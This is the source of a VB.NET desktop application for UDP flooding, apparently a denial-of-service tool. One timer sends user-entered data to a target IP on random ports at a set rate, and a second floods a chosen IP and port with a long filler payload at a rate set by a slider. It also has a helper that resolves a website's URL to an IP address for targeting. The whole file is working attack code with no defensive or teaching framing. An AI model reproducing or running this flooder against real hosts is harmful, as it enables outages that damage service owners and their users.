Imports System.Net
Imports System.Text
Imports System.Net.Sockets
Imports System.Diagnostics
Public Class Form1
    Dim mouseOffset As Point
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim RandomNumber As Integer
        Dim RandomClass As New Random
        RandomNumber = RandomClass.Next(100, 6400)

        Dim UdpClient As New UdpClient
        Dim GLOIP As IPAddress
        Dim bytCommand As Byte() = New Byte() {}
        GLOIP = IPAddress.Parse(Textbox1.Text)
        UdpClient.Connect(GLOIP, RandomNumber)
        bytCommand = Encoding.ASCII.GetBytes(Textbox2.Text)
        UdpClient.Send(bytCommand, bytCommand.Length)
        Label4.Text = +1
        Label5.Text = RandomNumber
        Label6.Text = (bytCommand.Length / 1024)

        Dim timeEX As Integer
        Dim kbcal As Integer

        timeEX = (1000 / Timer1.Interval)
        kbcal = (bytCommand.Length / 1024) * timeEX
        Label7.Text = kbcal & " kb/s"
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        If Textbox6.Text = "" Then
            Try
                ListBox1.Items.Add("Flood IP: " + Textbox1.Text)
                ListBox1.Items.Add(My.Computer.Info.AvailableVirtualMemory)
                ListBox1.Items.Add("")
                Dim udpClient As New UdpClient
                Dim GLOIP As IPAddress
                Dim bytCommand As Byte() = New Byte() {}
                GLOIP = IPAddress.Parse(Textbox4.Text)
                udpClient.Connect(GLOIP, Textbox5.Text)
                bytCommand = Encoding.ASCII.GetBytes("DataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataData")
                udpClient.Send(bytCommand, bytCommand.Length)
            Finally

            End Try
        Else
            Try
                ListBox1.Items.Add("Flood " + Textbox1.Text)
                ListBox1.Items.Add(My.Computer.Info.AvailableVirtualMemory)
                ListBox1.Items.Add("")
                Dim udpClient As New UdpClient
                Dim GLOIP As IPAddress
                Dim bytCommand As Byte() = New Byte() {}
                GLOIP = IPAddress.Parse(Textbox4.Text)
                udpClient.Connect(GLOIP, Textbox5.Text)
                bytCommand = Encoding.ASCII.GetBytes(Textbox6.Text)
                udpClient.Send(bytCommand, bytCommand.Length)
            Finally

            End Try
        End If
    End Sub

    Private Sub TrackBar1_Scroll(sender As Object, e As EventArgs) Handles TrackBar1.Scroll
        Timer2.Interval = TrackBar1.Value
        Label10.Text = TrackBar1.Value
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Textbox1.Enabled = False
        Textbox2.Enabled = False
        Textbox3.Enabled = False
        If Textbox2.Text = "" Then
            MsgBox("Add first Data")
        Else
            Button1.Visible = False
            Button2.Visible = True
            Timer1.Interval = Textbox3.Text
            Textbox1.Enabled = False
            Textbox2.Enabled = False
            Textbox3.Enabled = False

            Timer1.Start()
            Button1.Visible = False
            Button2.Visible = True
        End If
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Textbox1.Enabled = True
        Textbox2.Enabled = True
        Textbox3.Enabled = True
        Button1.Visible = True
        Button2.Visible = False
        Timer1.Stop()
        Label4.Text = "0"
        Label5.Text = "0"

        Button1.Visible = True
        Button2.Visible = False
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Textbox4.Enabled = False
        Textbox5.Enabled = False
        Textbox6.Enabled = False
        TrackBar1.Enabled = False
        Button3.Visible = False
        Button4.Visible = True
        Timer2.Start()
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        Button3.Visible = True
        Button4.Visible = True
        Textbox4.Enabled = True
        Textbox5.Enabled = True
        Textbox6.Enabled = True
        TrackBar1.Enabled = True
        Timer2.Stop()
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        If Textbox7.Text = "" Then
            MsgBox("Add first an URL")
        Else
            Try
                If Textbox7.Text.Contains("http://") Then
                    Dim iphe As IPHostEntry = Dns.GetHostEntry(Textbox7.Text.Replace("http://", String.Empty))
                    Textbox8.Text = iphe.AddressList(0).ToString()
                Else
                    Dim iphe As IPHostEntry = Dns.GetHostEntry(Textbox7.Text)
                    Textbox8.Text = iphe.AddressList(0).ToString()
                End If
            Catch ex As Exception
                MsgBox(ex)
            End Try
        End If
    End Sub

    Private Sub pictureBox12_Click(sender As Object, e As EventArgs) Handles pictureBox12.Click
        Application.Exit()
    End Sub

    Private Sub PictureBox2_Click(sender As Object, e As EventArgs) Handles PictureBox2.Click
        Me.WindowState = FormWindowState.Minimized
    End Sub

    Private Sub BunifuGradientPanel1_MouseMove(sender As Object, e As MouseEventArgs) Handles BunifuGradientPanel1.MouseMove
        If e.Button = MouseButtons.Left Then
            Dim mousePos = Control.MousePosition
            mousePos.Offset(mouseOffset.X, mouseOffset.Y)
            Location = mousePos
        End If
    End Sub

    Private Sub BunifuGradientPanel1_MouseDown(sender As Object, e As MouseEventArgs) Handles BunifuGradientPanel1.MouseDown
        mouseOffset = New Point(-e.X, -e.Y)
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub
End Class
